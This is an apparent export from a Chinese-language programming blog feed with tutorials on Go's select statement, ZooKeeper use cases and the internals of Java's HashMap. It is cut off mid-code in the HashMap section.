<h2 id="Rob-Pike"><a href="#Rob-Pike" class="headerlink" title="Rob Pike"></a>Rob Pike</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">package fac</span><br><span class="line"></span><br><span class="line"><span class="comment">// Factorial returns n!.</span></span><br><span class="line">func Factorial(n int) int <span class="punctuation">&#123;</span></span><br><span class="line">	res <span class="punctuation">:</span>= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	for i <span class="punctuation">:</span>= <span class="number">1</span>; i &lt;= n; i++ <span class="punctuation">&#123;</span></span><br><span class="line">		res *= i</span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">	return res</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来自：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1N1cGVyUGFpbnRtYW4vdGhlLWV2b2x1dGlvbi1vZi1hLWdvLXByb2dyYW1tZXI=">https://github.com/SuperPaintman/the-evolution-of-a-go-programmer<i class="fa fa-external-link-alt"></i></span> ，启发自《程序员的演变》<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJpZWwuY29tLmF1L2pva2VzL1RoZV9Fdm9sdXRpb25fb2ZfYV9Qcm9ncmFtbWVyLmh0bWw=">https://www.ariel.com.au/jokes/The_Evolution_of_a_Programmer.html<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>一文掌握 Go 语言 Select 的四大用法</title>
    <url>/2020/03/go-select/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文带大家认识 Go 语言的 Select 用法，相信大家对于 switch 并不陌生，然而 select 跟 switch 有个共同特性就是都通过 case 的方式来处理，但是 select 跟 switch 处理的事情完全不同，也完全不相容。</p>
<p>来看看 switch 有什么特性: 各种类型及型别操作，接口 interface{} 型别判断 variable.(type)，重点是会依照 case 顺序依序执行。</p>
<span id="more"></span>

<h2 id="先看个例子"><a href="#先看个例子" class="headerlink" title="先看个例子"></a>先看个例子</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">package <span class="selector-tag">main</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">var</span> (</span><br><span class="line">    <span class="selector-tag">i</span> interface&#123;&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func <span class="built_in">convert</span>(<span class="selector-tag">i</span> interface&#123;&#125;) &#123;</span><br><span class="line">    switch t := <span class="selector-tag">i</span>.(type) &#123;</span><br><span class="line">    caseint:</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;i is interger&quot;</span>, t)</span><br><span class="line">    casestring:</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;i is string&quot;</span>, t)</span><br><span class="line">    casefloat64:</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;i is float64&quot;</span>, t)</span><br><span class="line">    default:</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;type not found&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="selector-tag">main</span>() &#123;</span><br><span class="line">    <span class="selector-tag">i</span> = <span class="number">100</span></span><br><span class="line">    <span class="built_in">convert</span>(i)</span><br><span class="line">    <span class="selector-tag">i</span> = <span class="built_in">float64</span>(<span class="number">45.55</span>)</span><br><span class="line">    <span class="built_in">convert</span>(i)</span><br><span class="line">    <span class="selector-tag">i</span> = <span class="string">&quot;foo&quot;</span></span><br><span class="line">    <span class="built_in">convert</span>(i)</span><br><span class="line">    <span class="built_in">convert</span>(<span class="built_in">float32</span>(<span class="number">10.0</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行出来的结果如下:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">i <span class="keyword">is</span> <span class="built_in">int</span>erger <span class="number">100</span></span><br><span class="line">i <span class="keyword">is</span> <span class="built_in">float</span>64 +<span class="number">4.555000e+001</span></span><br><span class="line">i <span class="keyword">is</span> <span class="built_in">string</span> foo</span><br><span class="line">type <span class="keyword">not</span> found</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而 select 的特性就不同了，只能接收 channel，否则会出错，而 default 会直接执行，所以没有 default 的 select 就会遇到 blocking，假设没有送 value 进去 Channel 就会造成 panic，底下拿几个实际例子来解说。</p>
<h2 id="Random-Select"><a href="#Random-Select" class="headerlink" title="Random Select"></a>Random Select</h2><p>同一个 channel 在 select 会随机选取，底下看个例子:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(chanint, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 01&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 02&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后会发现有时候拿到 random 01 有时候拿到 random 02，这就是 select 的特性之一，case 是随机选取，所以当 select 有两个 channel 以上时，如果同时对全部 channel 送资料，则会随机选取到不同的 Channel。而上面有提到另一个特性『假设没有送 value 进入 Channel 就会造成 panic』，拿上面例子来改:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(chanint, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 01&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 02&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后会发现变成 deadlock，造成 main 主程式爆炸，这时候可以直接用 default 方式解决此问题:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(chanint, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 01&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">        fmt.Println(<span class="string">&quot;random 02&quot;</span>)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主程式 main 就不会因为读不到 channel value 造成整个程式 deadlock。</p>
<h2 id="Timeout-超时机制"><a href="#Timeout-超时机制" class="headerlink" title="Timeout 超时机制"></a>Timeout 超时机制</h2><p>用 select 读取 channle 时，一定会实作超过一定时间后就做其他事情，而不是一直 blocking 在 select 内。底下是简单的例子:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    timeout := <span class="built_in">make</span>(chanbool, <span class="number">1</span>)</span><br><span class="line">    gofunc() &#123;</span><br><span class="line">        time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">        timeout &lt;- <span class="literal">true</span></span><br><span class="line">    &#125;()</span><br><span class="line">    ch := <span class="built_in">make</span>(chanint)</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">    <span class="keyword">case</span> &lt;-timeout:</span><br><span class="line">        fmt.Println(<span class="string">&quot;timeout 01&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>建立 timeout channel，让其他地方可以透过 trigger timeout channel 达到让 select 执行结束，也或者有另一个写法是透握 time.After 机制</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">select &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ch:</span><br><span class="line"><span class="keyword">case</span> &lt;-timeout:</span><br><span class="line">    fmt.Println(<span class="string">&quot;timeout 01&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">    fmt.Println(<span class="string">&quot;timeout 02&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以注意 time.After 是回传 chan time.Time，所以执行 select 超过一秒时，就会输出 timeout 02。</p>
<h2 id="检查-channel-是否已满"><a href="#检查-channel-是否已满" class="headerlink" title="检查 channel 是否已满"></a>检查 channel 是否已满</h2><p>直接来看例子比较快:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> ch &lt;- <span class="number">2</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;channel value is&quot;</span>, &lt;-ch)</span><br><span class="line">        fmt.Println(<span class="string">&quot;channel value is&quot;</span>, &lt;-ch)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;channel blocking&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先宣告 buffer size 为 1 的 channel，先丢值把 channel 填满。这时候可以透过 select + default 方式来确保 channel 是否已满，上面例子会输出 channel blocking，我们再把程式改成底下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">func <span class="selector-tag">main</span>() &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(chanint, <span class="number">2</span>)</span><br><span class="line">    ch &lt;- <span class="number">1</span></span><br><span class="line">    select &#123;</span><br><span class="line">    case ch &lt;- <span class="number">2</span>:</span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;channel value is&quot;</span>, &lt;-ch)</span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;channel value is&quot;</span>, &lt;-ch)</span><br><span class="line">    default:</span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;channel blocking&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把 buffer size 改为 2 后，就可以继续在塞 value 进去 channel 了，这边的 buffer channel 观念可以看之前的文章<strong>『用五分钟了解什么是 unbuffered vs buffered channel』</strong>[1]</p>
<h2 id="select-for-loop-用法"><a href="#select-for-loop-用法" class="headerlink" title="select for loop 用法"></a>select for loop 用法</h2><p>如果你有多个 channel 需要读取，而读取是不间断的，就必须使用 for + select 机制来实现，更详细的实作可以参考『15 分钟学习 Go 语言如何处理多个 Channel 通道』</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line">    ch := <span class="built_in">make</span>(chanstring, <span class="number">0</span>)</span><br><span class="line">    deferfunc() &#123;</span><br><span class="line">        <span class="built_in">close</span>(ch)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    gofunc() &#123;</span><br><span class="line">    LOOP:</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">            fmt.Println(time.Now().Unix())</span><br><span class="line">            i++</span><br><span class="line"></span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> m := &lt;-ch:</span><br><span class="line">                <span class="built_in">println</span>(m)</span><br><span class="line">                <span class="keyword">break</span> LOOP</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second * <span class="number">4</span>)</span><br><span class="line">    ch &lt;- <span class="string">&quot;stop&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面例子可以发现执行后如下:</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">1574474619</span></span><br><span class="line"><span class="number">1574474620</span></span><br><span class="line"><span class="number">1574474621</span></span><br><span class="line"><span class="number">1574474622</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实把 default 拿掉也可以达到目的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> m := &lt;-ch:</span><br><span class="line">    <span class="built_in">println</span>(m)</span><br><span class="line">    <span class="keyword">break</span> LOOP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当没有值送进来时，就会一直停在 select 区段，所以其实没有 default 也是可以正常运作的，而要结束 for 或 select 都需要透过 break 来结束，但是要在 select 区间直接结束掉 for 回圈，只能使用 break variable 来结束，这边是大家需要注意的地方。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>[1]『用五分钟了解什么是 unbuffered vs buffered channel』:_<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnd1LWJveS5jb20vMjAxOS8wNC91bmRlcnN0YW5kLXVuYnVmZmVyZWQtdnMtYnVmZmVyZWQtY2hhbm5lbC1pbi1maXZlLW1pbnV0ZXMv">https://blog.wu-boy.com/2019/04/understand-unbuffered-vs-buffered-channel-in-five-minutes/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Select</tag>
      </tags>
  </entry>
  <entry>
    <title>ZooKeeper 都有哪些使用场景？</title>
    <url>/2020/04/apache-zookeeper/</url>
    <content><![CDATA[<h2 id="面试官心理分析"><a href="#面试官心理分析" class="headerlink" title="面试官心理分析"></a>面试官心理分析</h2><p>现在聊的 topic 是分布式系统，面试官跟你聊完了 dubbo 相关的一些问题之后，已经确认你对分布式服务框架&#x2F;RPC框架基本都有一些认知了。那么他可能开始要跟你聊分布式相关的其它问题了。</p>
<p>分布式锁这个东西，很常用的，你做 Java系统开发，分布式系统，可能会有一些场景会用到。最常用的分布式锁就是基于 zookeeper 来实现的。</p>
<span id="more"></span>

<p>其实说实话，问这个问题，一般就是看看你是否了解 zookeeper，因为 zk 是分布式系统中很常见的一个基础系统。而且问的话常问的就是说 zk 的使用场景是什么？看你知道不知道一些基本的使用场景。但是其实 zk 挖深了自然是可以问的很深很深的。</p>
<h2 id="面试题剖析"><a href="#面试题剖析" class="headerlink" title="面试题剖析"></a>面试题剖析</h2><p>大致来说，zk 的使用场景如下，我就举几个简单的，大家能说几个就好了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">分布式协调</span><br><span class="line">分布式锁</span><br><span class="line">元数据/配置信息管理</span><br><span class="line">HA高可用性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分布式协调"><a href="#分布式协调" class="headerlink" title="分布式协调"></a>分布式协调</h2><p>这个其实是 zk 很经典的一个用法，简单来说，就好比，你 A 系统发送个请求到 mq，然后 B 系统消息消费之后处理了。那 A 系统如何知道 B 系统的处理结果？用 zk 就可以实现分布式系统之间的协调工作。A 系统发送请求之后可以在 zk 上对某个节点的值注册个监听器，一旦 B 系统处理完了就修改 zk 那个节点的值，A 立马就可以收到通知，完美解决。</p>
<p><img src="/images/2020/up-551a0f196e1f4c9fda9713c8e5f0752cf45.webp" alt="分布式协调"> </p>
<p>zookeeper-distributed-coordination</p>
<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>举个栗子。对某一个数据连续发出两个修改操作，两台机器同时收到了请求，但是只能一台机器先执行完另外一个机器再执行。那么此时就可以使用 zk 分布式锁，一个机器接收到了请求之后先获取 zk 上的一把分布式锁，就是可以去创建一个 znode，接着执行操作；然后另外一个机器也尝试去创建那个 znode，结果发现自己创建不了，因为被别人创建了，那只能等着，等第一个机器执行完了自己再执行。</p>
<p><img src="/images/2020/up-4de830848ca1cfe8361db21d4d41330d121.webp" alt="分布式锁"> </p>
<p>zookeeper-distributed-lock-demo</p>
<h2 id="元数据-配置信息管理"><a href="#元数据-配置信息管理" class="headerlink" title="元数据&#x2F;配置信息管理"></a>元数据&#x2F;配置信息管理</h2><p>zk 可以用作很多系统的配置信息的管理，比如 kafka、storm 等等很多分布式系统都会选用 zk 来做一些元数据、配置信息的管理，包括 dubbo 注册中心不也支持 zk 么？</p>
<p><img src="/images/2020/up-125260e383f5cf445c9cc989b9ea6d6db17.webp" alt="元数据配置"></p>
<p>zookeeper-meta-data-manage</p>
<h2 id="HA高可用性"><a href="#HA高可用性" class="headerlink" title="HA高可用性"></a>HA高可用性</h2><p>这个应该是很常见的，比如 hadoop、hdfs、yarn 等很多大数据系统，都选择基于 zk 来开发 HA 高可用机制，就是一个重要进程一般会做主备两个，主进程挂了立马通过 zk 感知到切换到备用进程。</p>
<p><img src="/images/2020/up-05ead1ed36702139695e56038c46acc009a.webp" alt="HA高可用性"></p>
<p>zookeeper-active-standby</p>
]]></content>
      <categories>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>ZooKeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 集合之一 - HashMap</title>
    <url>/2020/04/java-hashmap/</url>
    <content><![CDATA[<h2 id="深入浅出学Java——HashMap"><a href="#深入浅出学Java——HashMap" class="headerlink" title="深入浅出学Java——HashMap"></a>深入浅出学Java——HashMap</h2><blockquote>
<p>哈希表（hash table）<br>也叫散列表，是一种非常重要的数据结构，应用场景及其丰富，许多缓存技术（比如memcached）的核心其实就是在内存中维护一张大的哈希表，本文会对java集合框架中HashMap的实现原理进行讲解，并对JDK7的HashMap源码进行分析。</p>
</blockquote>
<span id="more"></span>

<p><strong>一、什么是哈希表</strong></p>
<p>在讨论哈希表之前，我们先大概了解下其他数据结构在新增，查找等基础操作执行性能</p>
<p><strong>数组</strong>：采用一段连续的存储单元来存储数据。对于指定下标的查找，时间复杂度为O(1)；通过给定值进行查找，需要遍历数组，逐一比对给定关键字和数组元素，时间复杂度为O(n)，当然，对于有序数组，则可采用二分查找，插值查找，斐波那契查找等方式，可将查找复杂度提高为O(logn)；对于一般的插入删除操作，涉及到数组元素的移动，其平均复杂度也为O(n)</p>
<p><strong>线性链表</strong>：对于链表的新增，删除等操作（在找到指定操作位置后），仅需处理结点间的引用即可，时间复杂度为O(1)，而查找操作需要遍历链表逐一进行比对，复杂度为O(n)</p>
<p><strong>二叉树</strong>：对一棵相对平衡的有序二叉树，对其进行插入，查找，删除等操作，平均复杂度均为O(logn)。</p>
<p><strong>哈希表</strong>：相比上述几种数据结构，在哈希表中进行添加，删除，查找等操作，性能十分之高，不考虑哈希冲突的情况下（后面会探讨下哈希冲突的情况），仅需一次定位即可完成，时间复杂度为O(1)，接下来我们就来看看哈希表是如何实现达到惊艳的常数阶O(1)的。</p>
<p>我们知道，数据结构的物理存储结构只有两种：<strong>顺序存储结构</strong>和<strong>链式存储结构</strong>（像栈，队列，树，图等是从逻辑结构去抽象的，映射到内存中，也这两种物理组织形式），而在上面我们提到过，在数组中根据下标查找某个元素，一次定位就可以达到，哈希表利用了这种特性，<strong>哈希表的主干就是数组</strong>。</p>
<p><strong>比如我们要新增或查找某个元素，我们通过把当前元素的关键字 通过某个函数映射到数组中的某个位置，通过数组下标一次定位就可完成操作。</strong><br>　　<br>这个函数可以简单描述为：**存储位置 &#x3D; f(关键字)**，这个函数f一般称为哈希函数，这个函数的设计好坏会直接影响到哈希表的优劣。举个例子，比如我们要在哈希表中执行插入操作</p>
<p>哈希表数据插入过程</p>
<p><img src="/images/2020/2018110221063296.png"></p>
<p>查找操作同理，先通过哈希函数计算出实际存储地址，然后从数组中对应地址取出即可。</p>
<p><strong>哈希冲突</strong></p>
<p>然而万事无完美，<strong>如果两个不同的元素，通过哈希函数得出的实际存储地址相同怎么办</strong>？也就是说，当我们对某个元素进行哈希运算，得到一个存储地址，然后要进行插入的时候，发现已经被其他元素占用了，其实这就是所谓的<strong>哈希冲突</strong>，也叫<strong>哈希碰撞</strong>。前面我们提到过，哈希函数的设计至关重要，好的哈希函数会尽可能地保证 计算简单和散列地址分布均匀,但是，我们需要清楚的是，数组是一块连续的固定长度的内存空间，再好的哈希函数也不能保证得到的存储地址绝对不发生冲突。那么哈希冲突如何解决呢？哈希冲突的解决方案有多种:开放定址法（发生冲突，继续寻找下一块未被占用的存储地址），再散列函数法，链地址法，而HashMap即是采用了<strong>链地址法</strong>，也就是<strong>数组+链表</strong>的方式。</p>
<p>二、HashMap的实现原理</p>
<p>HashMap的主干是一个Entry数组。Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HashMap的主干数组，可以看到就是一个Entry数组，初始值为空数组&#123;&#125;，主干数组的长度一定是2的次幂。</span></span><br><span class="line"><span class="comment">//至于为什么这么做，后面会有详细分析。</span></span><br><span class="line"><span class="keyword">transient</span> Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Entry是HashMap中的一个静态内部类。代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">    <span class="type">int</span> hash;<span class="comment">//对key的hashcode值进行hash运算后得到的值，存储在Entry，避免重复计算</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates new entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Entry(<span class="type">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">        value = v;</span><br><span class="line">        next = n;</span><br><span class="line">        key = k;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以，HashMap的总体结构如下</p>
<p><img src="/images/2020/20181102221702492.png"></p>
<p>简单来说，<strong>HashMap由数组+链表组成的</strong>，数组是HashMap的主体，链表则是主要为了解决哈希冲突而存在的，如果定位到的数组位置不含链表（当前entry的next指向null）,那么查找，添加等操作很快，仅需一次寻址即可；如果定位到的数组包含链表，对于添加操作，其时间复杂度为O(n)，首先遍历链表，存在即覆盖，否则新增；对于查找操作来讲，仍需遍历链表，然后通过key对象的equals方法逐一比对查找。所以，性能考虑，<strong>HashMap中的链表出现越少，性能才会越好。</strong></p>
<p>其他几个重要字段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**实际存储的key-value键值对的个数*/</span></span><br><span class="line"><span class="keyword">transient</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**阈值，当table == &#123;&#125;时，该值为初始容量（初始容量默认为16）；当table被填充了，也就是为table分配内存空间后，</span></span><br><span class="line"><span class="comment">threshold一般为 capacity*loadFactory。HashMap在进行扩容时需要参考threshold，后面会详细谈到*/</span></span><br><span class="line"><span class="type">int</span> threshold;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**负载因子，代表了table的填充度有多少，默认是0.75</span></span><br><span class="line"><span class="comment">加载因子存在的原因，还是因为减缓哈希冲突，如果初始桶为16，等到满16个元素才扩容，某些桶里可能就有不止一个元素了。</span></span><br><span class="line"><span class="comment">所以加载因子默认为0.75，也就是说大小为16的HashMap，到了第13个元素，就会扩容成32。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">float</span> loadFactor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**HashMap被改变的次数，由于HashMap非线程安全，在对HashMap进行迭代时，</span></span><br><span class="line"><span class="comment">如果期间其他线程的参与导致HashMap的结构发生变化了（比如put，remove等操作），</span></span><br><span class="line"><span class="comment">需要抛出异常ConcurrentModificationException*/</span></span><br><span class="line"><span class="keyword">transient</span> <span class="type">int</span> modCount;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>HashMap有4个构造器，其他构造器如果用户没有传入initialCapacity 和loadFactor这两个参数，会使用默认值</p>
<p>initialCapacity默认为16，loadFactory默认为0.75</p>
<p>我们看下其中一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">HashMap</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">float</span> loadFactor)</span> &#123;</span><br><span class="line">　　　　　<span class="comment">//此处对传入的初始容量进行校验，最大不能超过MAXIMUM_CAPACITY = 1&lt;&lt;30(230)</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal initial capacity: &quot;</span> +</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">            initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                               loadFactor);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.loadFactor = loadFactor;</span><br><span class="line">        threshold = initialCapacity;</span><br><span class="line">　　　　　</span><br><span class="line">        init();<span class="comment">//init方法在HashMap中没有实际实现，不过在其子类如 linkedHashMap中就会有对应实现</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从上面这段代码我们可以看出，在常规构造器中，没有为数组table分配内存空间（有一个入参为指定Map的构造器例外），<strong>而是在执行put操作的时候才真正构建table数组</strong></p>
<p>OK,接下来我们来看看put操作的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="comment">//如果table数组为空数组&#123;&#125;，进行数组填充（为table分配实际内存空间），入参为threshold，</span></span><br><span class="line">        <span class="comment">//此时threshold为initialCapacity 默认是1&lt;&lt;4(24=16)</span></span><br><span class="line">        <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">            inflateTable(threshold);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//如果key为null，存储位置为table[0]或table[0]的冲突链上</span></span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);<span class="comment">//对key的hashcode进一步计算，确保散列均匀</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);<span class="comment">//获取在table中的实际位置</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        <span class="comment">//如果该对应数据已存在，执行覆盖操作。用新value替换旧value，并返回旧value</span></span><br><span class="line">            Object k;</span><br><span class="line">            <span 